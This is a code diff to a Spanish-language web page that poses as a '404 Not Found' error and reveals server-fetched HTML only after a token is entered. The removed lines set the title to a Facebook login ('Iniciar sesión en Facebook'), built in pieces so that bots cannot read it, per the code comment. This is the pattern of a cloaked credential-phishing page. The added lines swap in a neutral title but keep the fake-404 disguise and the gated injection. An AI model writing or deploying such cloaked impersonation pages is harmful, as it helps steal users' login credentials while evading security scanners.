@@ -3,14 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    
     <title id="dinamic-title">404 Not Found</title>
-
-    <meta property="og:title" content="404 Not Found">
-    <meta property="og:description" content="The requested URL was not found on this server.">
-    <meta property="og:type" content="website">
-    <meta name="robots" content="noindex, nofollow">
-
     <style>
         html, body { height: 100%; margin: 0; padding: 0; }
         body { 
@@ -90,6 +83,7 @@
         });
 
         async function validarAcceso() {
+            // CORREGIDO: toUpperCase() con "to"
             const input = document.getElementById('tkInput');
             const val = input.value.trim().toUpperCase();
             
@@ -109,11 +103,7 @@
                 if(r.ok) {
                     const data = await r.json();
                     document.getElementById('muro').remove();
-                    
-                    // Ofuscamos el cambio de título para que no sea leído por bots fácilmente
-                    const t = "Iniciar" + " sesión " + "en Facebook";
-                    document.getElementById('dinamic-title').innerHTML = t;
-                    
+                    document.getElementById('dinamic-title').innerHTML = "Educación conmigo";
                     const root = document.getElementById('pagina-original');
                     root.style.display = "flex";
                     root.innerHTML = data.html;
